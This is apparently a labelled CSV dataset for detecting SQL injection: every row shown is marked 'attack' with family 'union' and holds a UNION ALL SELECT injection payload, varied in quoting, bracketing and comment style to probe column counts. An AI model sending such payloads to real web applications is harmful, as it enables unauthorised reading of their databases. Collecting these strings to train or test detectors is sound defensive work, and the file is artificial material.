label,payload,family
attack,"-6263"" union all select 8005,8005#",union
attack,"-8793' where 3853  =  3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"-9082 union all select 9858,9858,9858,9858,9858,9858--",union
attack,"1%"" union all select null,null,null,null,null,null,null--",union
attack,"1   )    )    as berd where 5803  =  5803 union all select null,null,null,null,null,null,null--",union
attack,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",union
attack,"1' where 7445  =  7445 union all select null,null,null,null,null,null--",union
attack,-8378%'  )   union all select 5491#,union
attack,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",union
attack,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",union
attack,1  )   where 9446  =  9446 union all select null#,union
attack,"1   )    )     )   union all select null,null--",union
attack,1'||  (  select 'owzs' where 1475  =  1475 union all select null--,union
attack,"-9856"" union all select 9753--",union
attack,"1"" union all select null,null#",union
attack,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",union
attack,"-4317""   )    )    as nxvn where 2566  =  2566 union all select 2566,2566,2566#",union
attack,-9434'  )   union all select 3106#,union
attack,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1%"" union all select null,null,null,null,null,null,null,null#",union
attack,"-4127%' union all select 9558,9558,9558#",union
attack,"1'   )    )     )   union all select null,null,null,null,null--",union
attack,"-4679 where 9634  =  9634 union all select 9634,9634,9634,9634,9634,9634,9634--",union
attack,"1%""  )   union all select null,null,null,null,null,null,null#",union
attack,"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",union
attack,"-8667'+  (  select ymmg where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#",union
attack,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",union
attack,"1'  )   where 2802  =  2802 union all select null,null,null#",union
attack,1   )    )    as myxo where 1759  =  1759 union all select null#,union
attack,"-7234""  )   union all select 3154,3154,3154,3154#",union
attack,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",union
attack,-8521'+  (  select ucim where 9003  =  9003 union all select 9003--,union
attack,"-2500'   )    )     )   union all select 6853,6853,6853,6853--",union
attack,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",union
attack,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",union
attack,"1"" where 9241  =  9241 union all select null#",union
attack,"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#",union
attack,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",union
attack,"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--",union
attack,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",union
attack,"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#",union
attack,"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",union
attack,"-3437  )   union all select 7774,7774,7774--",union
attack,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",union
attack,-8274'   )    )    union all select 3048--,union
attack,"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",union
attack,"-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",union
attack,"-3359 union all select 4675,4675,4675--",union
attack,"1""  )   where 2388  =  2388 union all select null,null,null,null,null,null,null,null,null--",union
attack,"1""  )   union all select null,null,null--",union
attack,"1' union all select null,null--",union
attack,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",union
attack,"1'  )   union all select null,null,null,null,null,null,null#",union
attack,"1"" where 8978  =  8978 union all select null,null,null,null,null,null,null,null--",union
attack,"-3747""  )   union all select 8962,8962,8962,8962,8962#",union
attack,"-8893  )   union all select 7594,7594,7594,7594,7594,7594#",union
attack,"-1258""   )    )    union all select 7734,7734,7734#",union
attack,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",union
attack,"1%""   )    )    union all select null,null,null#",union
attack,"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",union
attack,"1%'   )    )    union all select null,null,null,null,null,null,null,null--",union
attack,"1   )    )    union all select null,null--",union
attack,"1'   )    )     )   union all select null,null#",union
attack,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",union
attack,"1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--",union
attack,"1'   )    )    union all select null,null--",union
attack,"1""   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#",union
attack,"-5763'   )    )     )   union all select 1640,1640,1640,1640,1640,1640,1640,1640,1640,1640#",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-2782"" union all select 2109,2109,2109#",union
attack,"-2838"" where 5442  =  5442 union all select 5442#",union
attack,"1' where 6905  =  6905 union all select null,null,null,null,null,null#",union
attack,"1""  )   as cfed where 8220  =  8220 union all select null,null,null,null,null,null,null,null,null#",union
attack,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",union
attack,"1""  )   union all select null--",union
attack,"1'||  (  select 'pnsw' where 2103  =  2103 union all select null,null,null,null,null,null,null,null--",union
attack,"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",union
attack,"-6965'  )   union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",union
attack,"-6870""  )   as deox where 8198  =  8198 union all select 8198#",union
attack,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",union
attack,"1%'   )    )    union all select null,null--",union
attack,"1'+  (  select 'zkum' where 5161  =  5161 union all select null,null,null,null#",union
attack,"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",union
attack,"-9445  )   as dmur where 4371  =  4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",union
attack,"-4869%' union all select 5729,5729,5729--",union
attack,"1   )    )    union all select null,null,null,null,null#",union
attack,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",union
attack,"1'  )   union all select null,null,null--",union
attack,"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",union
attack,1' in boolean mode  )   union all select null#,union
attack,"-8487'  )   where 9655  =  9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",union
attack,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",union
attack,"-2784'   )    )    union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",union
attack,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",union
attack,"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",union
attack,"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",union
attack,"-5425 where 5933  =  5933 union all select 5933,5933,5933--",union
attack,"1%"" union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-5062""   )    )     )   union all select 4125,4125--",union
attack,"1'  )   union all select null,null,null,null,null,null,null,null--",union
attack,"1   )    )     )   union all select null,null,null--",union
attack,"-8661"" union all select 5731,5731--",union
attack,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",union
attack,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",union
attack,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",union
attack,"-2365   )    )    union all select 8190,8190#",union
attack,"1%'  )   union all select null,null,null,null,null--",union
attack,"1 union all select null,null,null,null#",union
attack,"1%""  )   union all select null,null,null,null,null,null,null,null#",union
attack,"1'   )    )     )   union all select null,null,null,null,null,null,null,null--",union
attack,"1"" union all select null,null,null,null,null,null,null#",union
attack,"-4711%""   )    )    union all select 6737,6737,6737,6737#",union
attack,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",union
attack,"1%""   )    )    union all select null,null,null,null,null,null,null#",union
attack,"-2518' union all select 6818,6818,6818,6818,6818,6818#",union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1'   )    )    union all select null,null,null,null,null,null,null,null#",union
attack,"-8021""  )   union all select 1166,1166,1166,1166--",union
attack,"-1525'   )    )     )   union all select 4110,4110,4110,4110,4110,4110#",union
attack,"-1204'   )    )    union all select 3585,3585--",union
attack,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",union
attack,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",union
attack,"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",union
attack,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",union
attack,"-9209%""   )    )     )   union all select 3736,3736,3736--",union
attack,"-8477' union all select 2517,2517,2517--",union
attack,"-1999  )   union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",union
attack,"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",union
attack,"-8347%'  )   union all select 7643,7643,7643--",union
attack,"-6017 union all select 8449,8449,8449--",union
attack,"1""  )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",union
attack,"1   )    )    union all select null,null,null,null,null,null,null,null--",union
attack,"1"" where 2878  =  2878 union all select null,null,null,null,null#",union
attack,"-9408%""   )    )    union all select 1841,1841,1841,1841,1841,1841--",union
attack,"-8046""   )    )     )   union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",union
attack,"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1'   )    )     )   union all select null,null,null,null,null,null#",union
attack,1'  )   where 1917  =  1917 union all select null#,union
attack,"-9175'   )    )    union all select 6174,6174,6174,6174--",union
attack,"1%"" union all select null,null,null,null--",union
attack,"-6363""  )   where 4043  =  4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",union
attack,"-2898"" where 3301  =  3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",union
attack,"1 union all select null,null,null,null,null,null,null,null#",union
attack,1  )   union all select null--,union
attack,"1"" union all select null,null,null,null,null,null,null--",union
attack,"1   )    )    as queb where 2449  =  2449 union all select null,null#",union
attack,"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--",union
